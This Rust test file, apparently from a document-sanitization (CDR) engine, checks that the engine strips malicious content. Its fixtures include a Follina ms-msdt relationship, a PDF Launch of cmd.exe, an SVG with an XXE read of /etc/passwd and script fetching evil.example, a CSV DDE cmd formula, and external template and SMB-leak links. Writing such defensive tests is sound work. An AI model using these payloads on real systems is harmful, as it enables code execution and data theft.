use image::{ImageBuffer, Rgb};
use lopdf::{dictionary, Document, Object, Stream};
use std::io::{Cursor, Write};
use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use sentinel_cdr::engine::{CdrEngine, DetectedFormat};
use sentinel_cdr::policy::SanitizationPolicy;
use sentinel_cdr::sanitizers::image::ImageSanitizer;
use sentinel_cdr::worker::{WorkerLauncher, WorkerRequest};
use sentinel_proto::{DisarmPolicy, FileFormatType};

#[test]
fn test_fuzz_random_garbage_inputs_never_panic() {
    let policy = SanitizationPolicy::default();
    let engine = CdrEngine::new(policy);

    let adversarial_inputs: Vec<&[u8]> = vec![
        b"",
        b"\x00",
        b"%PDF-1.7\r\n\x00\x00\x00",
        b"PK\x03\x04\x14\x00\x00\x00",
        b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00",
        b"\x89PNG\r\n\x1a\n\x00\x00\x00",
        &[0xFF; 4096],
        &[0x00; 8192],
    ];

    for input in adversarial_inputs {
        let result = engine.sanitize(input);
        match result {
            Ok((sanitized_bytes, report)) => {
                assert!(!sanitized_bytes.is_empty() || input.is_empty());
                println!("Sanitized input cleanly: format={:?}", report.format);
            }
            Err(e) => {
                assert!(!e.to_string().is_empty());
            }
        }
    }
}

#[test]
fn test_fuzz_image_polyglot_truncation() {
    let policy = SanitizationPolicy::default();
    let engine = CdrEngine::new(policy);

    let img: ImageBuffer<Rgb<u8>, Vec<u8>> = ImageBuffer::from_pixel(4, 4, Rgb([255, 0, 0]));
    let mut valid_png_bytes = Vec::new();
    img.write_to(
        &mut Cursor::new(&mut valid_png_bytes),
        image::ImageFormat::Png,
    )
    .expect("PNG encoding should succeed");

    let overlay_shellcode = b"MALICIOUS_OVERLAY_SHELLCODE_VIRUS_PAYLOAD";
    valid_png_bytes.extend_from_slice(overlay_shellcode);

    let (clean_bytes, report) = engine
        .sanitize(&valid_png_bytes)
        .expect("PNG sanitization should succeed");

    assert!(!clean_bytes.is_empty());
    assert!(
        !clean_bytes
            .windows(overlay_shellcode.len())
            .any(|w| w == overlay_shellcode),
        "Overlay shellcode must be purged"
    );
    assert!(report.was_modified);
}

#[test]
fn test_jpeg_structure_with_exif_thumbnail_eoi_not_confused_for_main_eoi() {
    // BUG-CDR-05: A valid JPEG whose APP1 (0xFFE1) EXIF segment contains an embedded
    // thumbnail ending with 0xFF 0xD9 must NOT have that thumbnail EOI mistaken for the
    // main image EOI.
    let img: ImageBuffer<Rgb<u8>, Vec<u8>> = ImageBuffer::from_pixel(8, 8, Rgb([10, 120, 240]));
    let mut real_jpeg = Vec::new();
    img.write_to(&mut Cursor::new(&mut real_jpeg), image::ImageFormat::Jpeg)
        .expect("JPEG encode should succeed");

    // Splice a synthetic APP1 (0xFF 0xE1) EXIF segment right after SOI (0xFF 0xD8)
    // containing an inner 0xFF 0xD8 ... 0xFF 0xD9 thumbnail marker sequence.
    let exif_payload: &[u8] = b"Exif\x00\x00\xFF\xD8\xFF\xDB\x00\x04\x00\x00\xFF\xD9";
    let app1_len = (exif_payload.len() + 2) as u16;
    let mut jpeg_with_exif = Vec::new();
    jpeg_with_exif.extend_from_slice(&[0xFF, 0xD8]); // SOI
    jpeg_with_exif.extend_from_slice(&[0xFF, 0xE1]); // APP1 marker
    jpeg_with_exif.extend_from_slice(&app1_len.to_be_bytes());
    jpeg_with_exif.extend_from_slice(exif_payload);
    jpeg_with_exif.extend_from_slice(&real_jpeg[2..]); // rest of main JPEG ending in true EOI

    let scan = ImageSanitizer::scan_jpeg_structure(&jpeg_with_exif)
        .expect("Forward JPEG structural walk should succeed");
    assert_eq!(
        scan.trailing_overlay_bytes, 0,
        "JPEG with EXIF thumbnail EOI must have 0 trailing overlay bytes"
    );
    assert_eq!(scan.valid_end_offset, jpeg_with_exif.len());

    // Sanitize through CdrEngine and verify output is a valid, re-encoded JPEG
    let engine = CdrEngine::new(SanitizationPolicy::default());
    let (clean_jpeg, report) = engine
        .sanitize(&jpeg_with_exif)
        .expect("CDR must re-encode JPEG with EXIF thumbnail cleanly");
    assert!(clean_jpeg.starts_with(&[0xFF, 0xD8, 0xFF]));
    assert!(report.was_modified);
}

#[test]
fn test_openxml_external_rels_single_quotes_and_benign_printer_settings() {
    // BUG-CDR-04 & EV-04:
    // 1. Single-quoted / spaced `TargetMode = 'External'` relationships must be stripped.
    // 2. Benign `word/printerSettings/printerSettings1.bin` must NOT be falsely deleted,
    //    whereas `word/vbaProject.bin` and `word/embeddings/oleObject1.bin` MUST be stripped.
    let mut zip_buf = Vec::new();
    {
        let mut writer = ZipWriter::new(Cursor::new(&mut zip_buf));
        let opts = SimpleFileOptions::default();

        writer.start_file("[Content_Types].xml", opts).unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"#,
            )
            .unwrap();

        writer.start_file("word/document.xml", opts).unwrap();
        writer
            .write_all(br#"<w:document><w:body><w:p><w:t>Hello Safe World</w:t></w:p></w:body></w:document>"#)
            .unwrap();

        writer
            .start_file("word/_rels/document.xml.rels", opts)
            .unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="ms-msdt:/id PCWDiagnostic" TargetMode = 'External'/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rust-lang.org" TargetMode="External"/>
</Relationships>"#,
            )
            .unwrap();

        writer
            .start_file("word/printerSettings/printerSettings1.bin", opts)
            .unwrap();
        writer.write_all(b"BENIGN_PRINTER_DEVMODE_STRUCT").unwrap();

        writer.start_file("word/vbaProject.bin", opts).unwrap();
        writer.write_all(b"MALICIOUS_VBA_MACRO_STORAGE").unwrap();

        writer
            .start_file("word/embeddings/oleObject1.bin", opts)
            .unwrap();
        writer.write_all(b"EMBEDDED_OLE_PACKAGE").unwrap();

        writer.finish().unwrap();
    }

    let engine = CdrEngine::new(SanitizationPolicy::default());
    let (clean_docx, report) = engine
        .sanitize(&zip_buf)
        .expect("OOXML sanitization should succeed");

    assert!(report.was_modified);

    let mut clean_archive =
        zip::ZipArchive::new(Cursor::new(&clean_docx)).expect("Output must be valid ZIP");
    assert!(
        clean_archive.by_name("word/vbaProject.bin").is_err(),
        "vbaProject.bin must be stripped"
    );
    assert!(
        clean_archive
            .by_name("word/embeddings/oleObject1.bin")
            .is_err(),
        "embeddings/oleObject1.bin must be stripped"
    );
    assert!(
        clean_archive
            .by_name("word/printerSettings/printerSettings1.bin")
            .is_ok(),
        "Benign printerSettings1.bin must be preserved (BUG-CDR-04 #2)"
    );

    let mut rels_xml = String::new();
    std::io::Read::read_to_string(
        &mut clean_archive
            .by_name("word/_rels/document.xml.rels")
            .unwrap(),
        &mut rels_xml,
    )
    .unwrap();
    assert!(
        !rels_xml.contains("ms-msdt:"),
        "Single-quoted External Follina relationship must be stripped"
    );
    assert!(
        rels_xml.contains("styles.xml"),
        "Internal styles.xml relationship must be preserved"
    );
    assert!(
        rels_xml.contains("https://www.rust-lang.org"),
        "Benign external hyperlink relationship must be preserved (`Row 115`)"
    );

    // Verify `neutralize_dde_in_xml` fails closed on invalid UTF-8 or malformed XML (`Row 118`)
    let mut dummy_report = Vec::new();
    assert!(
        sentinel_cdr::sanitizers::openxml::OpenXmlSanitizer::neutralize_dde_in_xml(
            b"\xFF\xFE_INVALID_UTF8",
            "word/document.xml",
            &mut dummy_report
        )
        .is_err(),
        "neutralize_dde_in_xml must fail closed on invalid UTF-8"
    );
    assert!(
        sentinel_cdr::sanitizers::openxml::OpenXmlSanitizer::neutralize_dde_in_xml(
            b"<w:document><w:p attr=\"unterminated>",
            "word/document.xml",
            &mut dummy_report
        )
        .is_err(),
        "neutralize_dde_in_xml must fail closed on malformed XML"
    );
}

#[test]
fn test_pdf_preserves_transparency_and_dests_while_stripping_js_and_inline_annots() {
    // BUG-CDR-06:
    // 1. `/S /Transparency` and `/Dests` must NOT be stripped.
    // 2. `/JavaScript`, `/OpenAction`, and inline `/Annots` dictionaries containing `/Launch` MUST be stripped.
    let mut doc = Document::with_version("1.7");
    let pages_id = doc.new_object_id();

    let transparency_group = dictionary! {
        "Type" => "Group",
        "S" => "Transparency",
        "CS" => "DeviceRGB",
    };

    let malicious_inline_annot = dictionary! {
        "Type" => "Annot",
        "Subtype" => "Widget",
        "A" => Object::Dictionary(dictionary! {
            "S" => "Launch",
            "F" => Object::string_literal("cmd.exe"),
        }),
    };

    let contents_id = doc.add_object(Stream::new(
        dictionary! {},
        b"BT /F1 12 Tf (Hello PDF) Tj ET".to_vec(),
    ));

    let page_id = doc.add_object(dictionary! {
        "Type" => "Page",
        "Parent" => pages_id,
        "Group" => Object::Dictionary(transparency_group),
        "Annots" => vec![Object::Dictionary(malicious_inline_annot)],
        "Contents" => contents_id,
    });

    doc.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! {
            "Type" => "Pages",
            "Kids" => vec![page_id.into()],
            "Count" => 1,
        }),
    );

    let dests_id = doc.add_object(dictionary! {
        "Section1" => vec![page_id.into(), Object::Name(b"XYZ".to_vec())],
    });

    let catalog_id = doc.add_object(dictionary! {
        "Type" => "Catalog",
        "Pages" => pages_id,
        "Dests" => dests_id,
        "OpenAction" => Object::Dictionary(dictionary! {
            "S" => "JavaScript",
            "JS" => Object::string_literal("app.alert('pwned');"),
        }),
    });
    doc.trailer.set("Root", catalog_id);

    let mut raw_pdf = Vec::new();
    doc.save_to(&mut raw_pdf).unwrap();

    let engine = CdrEngine::new(SanitizationPolicy::default());
    let (clean_pdf, report) = engine
        .sanitize(&raw_pdf)
        .expect("PDF sanitization should succeed");

    assert!(report.was_modified);

    let clean_doc = Document::load_mem(&clean_pdf).expect("Sanitized PDF must be valid");
    let clean_page = clean_doc.get_object(page_id).unwrap().as_dict().unwrap();

    // Verify /Group << /S /Transparency >> survived intact
    let group_dict = clean_page.get(b"Group").unwrap().as_dict().unwrap();
    assert_eq!(
        group_dict.get(b"S").unwrap().as_name_str().unwrap(),
        "Transparency"
    );

    // Verify /Dests survived in Catalog while /OpenAction was removed
    let clean_catalog = clean_doc.get_object(catalog_id).unwrap().as_dict().unwrap();
    assert!(
        clean_catalog.get(b"Dests").is_ok(),
        "Legitimate /Dests table must be preserved"
    );
    assert!(
        clean_catalog.get(b"OpenAction").is_err(),
        "/OpenAction JavaScript must be stripped"
    );

    // Verify inline /Annots /A /Launch was stripped
    let annots = clean_page.get(b"Annots").unwrap().as_array().unwrap();
    let annot_dict = annots[0].as_dict().unwrap();
    assert!(
        annot_dict.get(b"A").is_err(),
        "Inline annotation /A /Launch action must be stripped"
    );
}

#[test]
fn test_svg_and_csv_and_text_sanitizers() {
    let default_policy = SanitizationPolicy::default();
    let engine = CdrEngine::new(default_policy.clone());

    // 1. Default-deny allowlist (`High #11`, Rows 132-136): SVG, OLE2, and generic ArchiveZip are rejected by default
    let dirty_svg = br##"<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)"><style>@import url('https://evil.example/a.css');</style><script>fetch('https://evil.example')</script><a href="https://evil.example/phish" xlink:href="#safe_anchor"><rect id="safe_anchor" width="100" height="100" fill="blue"/></a></svg>"##;
    assert!(
        engine
            .sanitize_with_hint(dirty_svg, "diagram.svg", &default_policy)
            .is_err(),
        "Default SanitizationPolicy must reject SVG unless allow_svg is enabled (`High #11`)"
    );

    // Enable `allow_svg = true` and verify full SVG sanitization (`Row 133`)
    let mut svg_policy = SanitizationPolicy::default();
    svg_policy.allow_svg = true;
    let svg_outcome = engine
        .sanitize_with_hint(dirty_svg, "diagram.svg", &svg_policy)
        .expect("SVG CDR with allow_svg=true should succeed");
    let clean_svg_str = String::from_utf8_lossy(&svg_outcome.clean_bytes);
    assert_eq!(svg_outcome.detected_format, DetectedFormat::Svg);
    assert!(!clean_svg_str.to_ascii_lowercase().contains("<!doctype"));
    assert!(!clean_svg_str.to_ascii_lowercase().contains("<!entity"));
    assert!(!clean_svg_str.contains("<script"));
    assert!(!clean_svg_str.contains("onload="));
    assert!(!clean_svg_str.contains("@import"));
    assert!(!clean_svg_str.contains("https://evil.example"));
    assert!(
        clean_svg_str.contains("#safe_anchor"),
        "Internal #anchor reference must be preserved"
    );
    assert!(clean_svg_str.contains("<rect"));

    // 2. CSV with DDE formula injection and BiDi override
    let dirty_csv = format!("Name,Formula\nAlice{},\t=cmd|'/c calc'!A0\n", '\u{202E}');
    let csv_outcome = engine
        .sanitize_with_hint(dirty_csv.as_bytes(), "report.csv", engine.policy())
        .expect("CSV CDR should succeed");
    let clean_csv_str = String::from_utf8_lossy(&csv_outcome.clean_bytes);
    assert_eq!(csv_outcome.detected_format, DetectedFormat::Csv);
    assert!(
        !clean_csv_str.contains('\u{202E}'),
        "BiDi override must be stripped"
    );
    assert!(
        clean_csv_str.contains("'\t=cmd"),
        "DDE formula cell must be neutralized with leading apostrophe"
    );

    // 3. Lossless WebP EXIF/XMP RIFF subchunk stripping (`Rows 128, 131`)
    let mut webp_riff = Vec::new();
    webp_riff.extend_from_slice(b"RIFF");
    webp_riff.extend_from_slice(&0u32.to_le_bytes()); // size placeholder
    webp_riff.extend_from_slice(b"WEBP");
    // VP8L dummy chunk (4 bytes payload)
    webp_riff.extend_from_slice(b"VP8L");
    webp_riff.extend_from_slice(&4u32.to_le_bytes());
    webp_riff.extend_from_slice(&[0x2F, 0x00, 0x00, 0x00]);
    // EXIF chunk (8 bytes payload)
    webp_riff.extend_from_slice(b"EXIF");
    webp_riff.extend_from_slice(&8u32.to_le_bytes());
    webp_riff.extend_from_slice(b"ExifData");
    // XMP chunk (8 bytes payload)
    webp_riff.extend_from_slice(b"XMP ");
    webp_riff.extend_from_slice(&8u32.to_le_bytes());
    webp_riff.extend_from_slice(b"<x:xmp/>");
    let orig_riff_len = (webp_riff.len() - 8) as u32;
    webp_riff[4..8].copy_from_slice(&orig_riff_len.to_le_bytes());
    // Append 12 bytes of trailing overlay
    webp_riff.extend_from_slice(b"OVERLAY_JUNK");

    let mut lossless_img_policy = SanitizationPolicy::default();
    lossless_img_policy.reencode_images = false;
    let webp_outcome = engine
        .sanitize_with_hint(&webp_riff, "photo.webp", &lossless_img_policy)
        .expect("Lossless WebP sanitization should strip EXIF/XMP and overlay");
    let webp_scan =
        ImageSanitizer::scan_webp_structure(&webp_outcome.clean_bytes).expect("Valid WebP");
    assert_eq!(webp_scan.trailing_overlay_bytes, 0);
    assert!(
        !webp_scan.has_metadata,
        "EXIF and XMP RIFF subchunks must be stripped in lossless WebP mode"
    );

    // 4. OLE2 CFB FAT sector chain and directory entry wiping (`Row 134`)
    let mut cfb = vec![0u8; 512 * 4]; // Header + Sector 0 (FAT) + Sector 1 (Directory) + Sector 2 (VBA Stream)
    cfb[0..8].copy_from_slice(&sentinel_cdr::sanitizers::ole2::OLE2_MAGIC);
    cfb[30..32].copy_from_slice(&9u16.to_le_bytes()); // sector_shift = 9 (512B)
    cfb[32..34].copy_from_slice(&6u16.to_le_bytes()); // mini_sector_shift = 6 (64B)
    cfb[48..52].copy_from_slice(&1u32.to_le_bytes()); // first_dir_sector = 1
    cfb[56..60].copy_from_slice(&4096u32.to_le_bytes()); // mini_stream_cutoff = 4096
    cfb[60..64].copy_from_slice(&0xFFFF_FFFEu32.to_le_bytes()); // first_minifat = ENDOFCHAIN
    cfb[68..72].copy_from_slice(&0xFFFF_FFFEu32.to_le_bytes()); // first_difat = ENDOFCHAIN
    cfb[76..80].copy_from_slice(&0u32.to_le_bytes()); // DIFAT[0] = Sector 0 (FAT)
    for off in (80..512).step_by(4) {
        cfb[off..off + 4].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
    }
    // Sector 0 (offset 512..1024): FAT table
    for off in (512..1024).step_by(4) {
        cfb[off..off + 4].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
    }
    cfb[512..516].copy_from_slice(&0xFFFF_FFFDu32.to_le_bytes()); // Sec 0 = FATSECT
    cfb[516..520].copy_from_slice(&0xFFFF_FFFEu32.to_le_bytes()); // Sec 1 = Directory ENDOFCHAIN
    cfb[520..524].copy_from_slice(&0xFFFF_FFFEu32.to_le_bytes()); // Sec 2 = Stream ENDOFCHAIN
                                                                  // Sector 1 (offset 1024..1536): Directory entry 0 = "_VBA_PROJECT" stream at Sector 2, size 4096
    let dir_off = 1024;
    let name_utf16: Vec<u16> = "_VBA_PROJECT"
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    for (i, ch) in name_utf16.iter().enumerate() {
        cfb[dir_off + i * 2..dir_off + i * 2 + 2].copy_from_slice(&ch.to_le_bytes());
    }
    cfb[dir_off + 64..dir_off + 66].copy_from_slice(&((name_utf16.len() * 2) as u16).to_le_bytes());
    cfb[dir_off + 66] = 2; // Stream
    cfb[dir_off + 116..dir_off + 120].copy_from_slice(&2u32.to_le_bytes()); // start_sec = 2
    cfb[dir_off + 120..dir_off + 128].copy_from_slice(&4096u64.to_le_bytes());
    // Sector 2 (offset 1536..2048): Malicious VBA p-code bytes
    let vba_payload = b"MALICIOUS_VBA_PCODE_SECTOR_PAYLOAD";
    cfb[1536..1536 + vba_payload.len()].copy_from_slice(vba_payload);

    assert!(
        engine
            .sanitize_with_hint(&cfb, "legacy.doc", &default_policy)
            .is_err(),
        "Default policy must reject legacy OLE2 (`allow_legacy_ole2 = false`)"
    );
    let mut ole_policy = SanitizationPolicy::default();
    ole_policy.allow_legacy_ole2 = true;
    let ole_outcome = engine
        .sanitize_with_hint(&cfb, "legacy.doc", &ole_policy)
        .expect("OLE2 sanitization with allow_legacy_ole2=true should succeed");
    assert!(
        !ole_outcome
            .clean_bytes
            .windows(vba_payload.len())
            .any(|w| w == vba_payload),
        "OLE2 sanitizer must wipe the stream data sectors in the FAT chain, not just the directory entry (`Row 134`)"
    );
}

#[test]
fn test_worker_pipe_protocol_roundtrip() {
    // BUG-CDR-10 & Phase 2.1: Test length-prefixed JSON pipe framing and one-shot worker execution
    let req = WorkerRequest {
        file_name: "notes.txt".to_string(),
        raw_bytes: format!("Safe line{}\n", '\u{202E}').into_bytes(),
        policy: SanitizationPolicy::default(),
    };

    let mut pipe_buf = Vec::new();
    req.write_framed(&mut pipe_buf).unwrap();

    let decoded_req = WorkerRequest::read_framed(Cursor::new(&pipe_buf)).unwrap();
    let launcher = WorkerLauncher::new();
    let outcome = launcher
        .sanitize_isolated(decoded_req)
        .expect("Isolated worker sanitization should succeed");
    assert!(!String::from_utf8_lossy(&outcome.clean_bytes).contains('\u{202E}'));
}

#[test]
fn test_policy_proto_respects_caller_overrides() {
    // BUG-CDR-03 & Row 102: SanitizationPolicy::from_proto honors caller flags above a permissive floor
    // and enforces server_ceiling as a mandatory security floor when strip flags are true.
    let proto = DisarmPolicy {
        strip_macros: false,
        strip_javascript: true,
        strip_embedded_files: false,
        strip_external_hyperlinks: true,
        strip_exif_metadata: false,
        truncate_overlay_bytes: false,
        max_recursion_depth: 2,
        strip_pdf_actions: true,
        strip_office_dde: true,
        reencode_images: true,
        max_decompressed_bytes: 32 * 1024 * 1024,
    };

    let permissive = SanitizationPolicy::permissive_floor();
    let policy = SanitizationPolicy::from_proto(Some(proto.clone()), &permissive);
    assert!(!policy.strip_office_macros);
    assert!(policy.strip_pdf_scripts);
    assert!(!policy.strip_office_ole_objects);
    assert_eq!(policy.max_recursion_depth, 2);
    assert_eq!(policy.max_decompressed_bytes, 32 * 1024 * 1024);

    // Against the default strict server ceiling, callers cannot disable mandatory stripping (`Row 102`)
    let strict_ceiling = SanitizationPolicy::default();
    let enforced = SanitizationPolicy::from_proto(Some(proto), &strict_ceiling);
    assert!(enforced.strip_office_macros);
    assert!(enforced.strip_pdf_scripts);
    assert!(enforced.strip_office_ole_objects);
    assert_eq!(enforced.max_recursion_depth, 2);
    assert_eq!(enforced.max_decompressed_bytes, 32 * 1024 * 1024);

    // Ensure new FileFormatType variants map cleanly (BUG-CDR-02)
    assert_eq!(FileFormatType::FormatSvg as i32, 8);
    assert_eq!(FileFormatType::FormatOle2 as i32, 9);
    assert_eq!(FileFormatType::FormatTxt as i32, 10);
    assert_eq!(FileFormatType::FormatCsv as i32, 11);
    assert_eq!(FileFormatType::FormatArchiveZip as i32, 12);
}

#[test]
fn test_pdf_next_cycle_terminates() {
    use lopdf::{Dictionary, StringFormat};
    use sentinel_cdr::sanitizers::pdf::PdfSanitizer;

    // Master Plan v2 §2.2, §2.4, §5 (`pdf_next_cycle_terminates`):
    // Construct a PDF where two indirect Action dictionaries reference each other via `/Next`
    // (`action1_id -> action2_id -> action1_id`) and verify `PdfSanitizer::sanitize` terminates
    // cleanly, breaks the cycle, and strips the actions.
    let mut doc = Document::with_version("1.5");
    let pages_id = doc.new_object_id();
    let page_id = doc.new_object_id();
    let action1_id = doc.new_object_id();
    let action2_id = doc.new_object_id();

    let mut action1 = Dictionary::new();
    action1.set("Type", Object::Name(b"Action".to_vec()));
    action1.set("S", Object::Name(b"URI".to_vec()));
    action1.set(
        "URI",
        Object::String(b"https://evil.example/1".to_vec(), StringFormat::Literal),
    );
    action1.set("Next", Object::Reference(action2_id));
    doc.objects.insert(action1_id, Object::Dictionary(action1));

    let mut action2 = Dictionary::new();
    action2.set("Type", Object::Name(b"Action".to_vec()));
    action2.set("S", Object::Name(b"URI".to_vec()));
    action2.set(
        "URI",
        Object::String(b"https://evil.example/2".to_vec(), StringFormat::Literal),
    );
    action2.set("Next", Object::Reference(action1_id));
    doc.objects.insert(action2_id, Object::Dictionary(action2));

    let content_id = doc.add_object(Stream::new(Dictionary::new(), b"BT /F1 12 Tf ET".to_vec()));
    let mut page_dict = Dictionary::new();
    page_dict.set("Type", Object::Name(b"Page".to_vec()));
    page_dict.set("Parent", Object::Reference(pages_id));
    page_dict.set("Contents", Object::Reference(content_id));
    doc.objects.insert(page_id, Object::Dictionary(page_dict));

    let mut pages_dict = Dictionary::new();
    pages_dict.set("Type", Object::Name(b"Pages".to_vec()));
    pages_dict.set("Kids", Object::Array(vec![Object::Reference(page_id)]));
    pages_dict.set("Count", Object::Integer(1));
    doc.objects.insert(pages_id, Object::Dictionary(pages_dict));

    let mut catalog = Dictionary::new();
    catalog.set("Type", Object::Name(b"Catalog".to_vec()));
    catalog.set("Pages", Object::Reference(pages_id));
    catalog.set("OpenAction", Object::Reference(action1_id));
    let catalog_id = doc.add_object(Object::Dictionary(catalog));
    doc.trailer.set("Root", Object::Reference(catalog_id));

    let mut raw_pdf = Vec::new();
    doc.save_to(&mut raw_pdf).unwrap();

    let policy = SanitizationPolicy::default();
    let (_clean_pdf, reports) = PdfSanitizer::sanitize(&raw_pdf, &policy)
        .expect("Cyclic /Next PDF must terminate cleanly without hanging");

    assert!(
        reports
            .iter()
            .any(|r| r.element_type == "PDF_ACTION_NEXT_CYCLE"),
        "Cycle detector must report PDF_ACTION_NEXT_CYCLE on circular /Next chain"
    );
}

// =========================================================================
// Master Plan v2 §5 Exact Edge-Case Matrix Test Suite (CDR Targets)
// =========================================================================

#[test]
fn large_pptx_macros_removed() {
    // Master Plan v2 §5 (`T4`, `large_pptx_macros_removed`):
    // Construct a >4.5 MB `.pptx` presentation containing a 4.7 MB slide media asset,
    // `ppt/vbaProject.bin` past the 4 MB mark, macro-enabled `[Content_Types].xml`,
    // and `ppt/_rels/presentation.xml.rels` referencing `vbaProject.bin`.
    let mut zip_buf = Vec::new();
    {
        let mut writer = ZipWriter::new(Cursor::new(&mut zip_buf));
        let deflate_opts = SimpleFileOptions::default();
        let stored_opts =
            SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

        writer
            .start_file("[Content_Types].xml", deflate_opts)
            .unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bmp" ContentType="image/bmp"/>
  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml"/>
  <Override PartName="/ppt/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"#,
            )
            .unwrap();

        writer
            .start_file("ppt/presentation.xml", deflate_opts)
            .unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst>
</p:presentation>"#,
            )
            .unwrap();

        writer
            .start_file("ppt/_rels/presentation.xml.rels", deflate_opts)
            .unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/>
</Relationships>"#,
            )
            .unwrap();

        writer
            .start_file("ppt/slides/slide1.xml", deflate_opts)
            .unwrap();
        writer
            .write_all(br#"<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld/></p:sld>"#)
            .unwrap();

        // >4.5 MB stored media asset so `ppt/vbaProject.bin` lies past the old 4 MB prefix window
        writer
            .start_file("ppt/media/slide_bg_4k.bmp", stored_opts)
            .unwrap();
        writer.write_all(&vec![0x3Cu8; 4_700_000]).unwrap();

        writer
            .start_file("ppt/vbaProject.bin", stored_opts)
            .unwrap();
        writer
            .write_all(b"MALICIOUS_PPTX_VBA_MACRO_STORAGE_PAST_4500KB_BOUNDARY")
            .unwrap();

        writer.finish().unwrap();
    }
    assert!(
        zip_buf.len() > 4_600_000,
        "Test PPTX archive must exceed 4.5 MB"
    );

    let engine = CdrEngine::new(SanitizationPolicy::default());
    let (clean_pptx, report) = engine
        .sanitize(&zip_buf)
        .expect(">4.5 MB PPTX macro sanitization must succeed");
    assert!(report.was_modified);

    let mut clean_archive =
        zip::ZipArchive::new(Cursor::new(&clean_pptx)).expect("Output must be valid PPTX ZIP");
    assert!(
        clean_archive.by_name("ppt/vbaProject.bin").is_err(),
        "ppt/vbaProject.bin must be stripped from >4.5 MB PPTX (`T4`)"
    );
    assert!(
        clean_archive.by_name("ppt/media/slide_bg_4k.bmp").is_ok(),
        "4.7 MB slide media asset must be preserved"
    );

    let mut ct_xml = String::new();
    std::io::Read::read_to_string(
        &mut clean_archive.by_name("[Content_Types].xml").unwrap(),
        &mut ct_xml,
    )
    .unwrap();
    assert!(
        ct_xml.contains(
            "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"
        ),
        "[Content_Types].xml must upgrade macroEnabled PPTM content type to standard PPTX (`Row 116`)"
    );
    assert!(
        !ct_xml.contains("vbaProject"),
        "[Content_Types].xml must remove vbaProject Override"
    );

    let mut rels_xml = String::new();
    std::io::Read::read_to_string(
        &mut clean_archive
            .by_name("ppt/_rels/presentation.xml.rels")
            .unwrap(),
        &mut rels_xml,
    )
    .unwrap();
    assert!(
        !rels_xml.contains("vbaProject"),
        "ppt/_rels/presentation.xml.rels must remove vbaProject relationship"
    );
    assert!(
        rels_xml.contains("slides/slide1.xml"),
        "Legitimate slide relationship must be preserved"
    );
}

#[test]
fn rels_quote_variants() {
    // Master Plan v2 §2.3 & §5 (`T5`, `rels_quote_variants`, `Row 115`):
    // Verify single-quoted `TargetMode='External'`, whitespace-padded `TargetMode = "External"`,
    // and uppercase `TargetMode="EXTERNAL"` external relationships are stripped by `quick-xml`,
    // dangling `r:id` attributes in content `.xml` are stripped, and output XML is well-formed.
    let mut zip_buf = Vec::new();
    {
        let mut writer = ZipWriter::new(Cursor::new(&mut zip_buf));
        let opts = SimpleFileOptions::default();

        writer.start_file("[Content_Types].xml", opts).unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
</Types>"#,
            )
            .unwrap();

        writer
            .start_file("word/_rels/document.xml.rels", opts)
            .unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate' Target='https://evil.example/tpl.dotm' TargetMode='External'/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="https://evil.example/frame.html" TargetMode = "External"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument" Target="\\\\10.99.0.1\\smb\\leak.doc" TargetMode="EXTERNAL"/>
